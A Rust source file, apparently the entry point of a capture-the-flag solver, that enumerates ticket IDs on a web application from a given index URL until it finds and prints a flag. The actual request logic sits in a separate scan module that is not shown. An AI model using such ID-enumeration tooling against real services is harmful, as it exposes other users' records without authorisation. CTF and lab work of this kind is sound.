use clap::Parser;
use reqwest::{Client, Url, redirect::Policy};

#[allow(dead_code)]
mod skipseq;

use skipseq::SkipSeq;

mod scan;

use scan::*;

#[derive(Parser)]
struct Cli {
    /// The URL to the index page.
    index_url: Url,
    #[arg(short, long)]
    /// Prints information about progress.
    verbose: bool,
}

#[tokio::main]
async fn main() -> Result<(), ScanError> {
    let Cli {
        index_url,
        verbose,
    } = Cli::parse();
    let client = Client::builder()
        .cookie_store(true)
        .redirect(Policy::limited(1))
        .build()
        .expect("Failed to initialize client.");

    let mut checked_ids = SkipSeq::new(1);
    // Scanning could be made parallel, but non-trivially and ideally with cancellation.
    loop {
        let next_id = checked_ids.next();
        if verbose {
            println!("Fetching ticket {next_id}...");
        }

        match scan(&client, index_url.clone(), next_id).await? {
            Scan::Success { flag, id } => {
                println!("Found flag: {flag} (ticket #{id})");
                return Ok(());
            }
            Scan::Failure { username, ids } => {
                if verbose {
                    println!(
                        "Searched user \"{username}\", eliminated {} tickets.",
                        ids.len()
                    );
                }
                for id in ids {
                    _ = checked_ids.skip(id);
                }
            }
        }
    }
}
